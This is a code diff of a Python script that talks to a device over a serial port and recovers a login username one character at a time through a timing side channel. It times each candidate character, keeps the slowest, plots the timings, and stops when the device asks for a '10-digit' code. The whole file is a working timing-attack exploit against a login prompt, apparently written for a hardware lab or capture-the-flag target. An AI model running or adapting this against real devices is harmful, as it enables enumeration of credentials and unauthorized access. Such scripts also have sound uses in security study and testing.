@@ -2,6 +2,10 @@ import serial
 import matplotlib.pyplot as plt
 import numpy
 import time
+from rich.console import Console
+from rich.progress import Progress
+
+KEYS = list("123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
 
 def print_graph(counts):
     fig, ax = plt.subplots()
@@ -14,37 +18,53 @@ def print_graph(counts):
 
     plt.show()
 
-KEYS = list("123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
-#KEYS = ''.join([chr(i) for i in range(128)])
+def get_username(serial_port, symbol):
+    prefix = ""
+
+    console = Console()
+    console.log("[green]Start finding username", log_locals=False)
+    while True:
+        current_symbol = []
+
+        while(True):
+            result = serial_port.readline()
+            if("Invalid" in result.decode()):
+                break;
+            else:
+                serial_port.write(serial_port.write((".").encode("ascii")))
+                serial_port.flush()
+
+        with Progress() as progress:
+            task = progress.add_task("[green]Testing symbols...", total=len(symbol))
+            for i in range(len(symbol)):
+                start = time.perf_counter_ns()
+                serial_port.write((prefix + symbol[i]).encode("ascii"))
+                serial_port.flush()
+
+                while(True):
+                    result = serial_port.readline()
+                    if("Invalid" in result.decode()):
+                        break;
+                
+                    if("10-digit" in result.decode()):
+                        prefix = prefix + symbol[i]
+                        progress.update(task, visible=False)
+                        console.log(f"Username found : {prefix}", log_locals=False);
+                        return prefix
+                
+                stop = time.perf_counter_ns()
+                progress.update(task, advance=1)
+                result = stop - start
+                current_symbol.append(result)
+
+        average = numpy.mean(current_symbol)
+        for i in range(len(current_symbol)):
+            current_symbol[i] = current_symbol[i] - average
+
+        prefix += symbol[current_symbol.index(numpy.max(current_symbol))]
+        progress.update(task, visible=False)
+        console.log(f"Symbol found : {prefix}", log_locals=False);
+        print_graph(current_symbol)
 
 ser = serial.Serial('COM3', 115200, timeout=1)
-graph = []
-
-while(True):
-    result = ser.readline()
-    if("Invalid" in result.decode()):
-        break;
-    else:
-        ser.write(ser.write(("test").encode()))
-        ser.flush()
-
-for i in range(len(KEYS)):
-    start = time.perf_counter_ns()
-    ser.write(("Barr" + KEYS[i] + '\n').encode())
-    ser.flush()
-
-    while(True):
-        result = ser.readline()
-        if("Invalid" in result.decode() or "10-digit" in result.decode()):
-            break;
-    
-    stop = time.perf_counter_ns()
-    result = stop - start
-    print(f"Result for {KEYS[i]} is : {result}")
-    graph.append(result)
-
-average = numpy.mean(graph)
-for i in range(len(graph)):
-    graph[i] = graph[i] - average
-
-print_graph(graph)
+username = get_username(ser, KEYS)
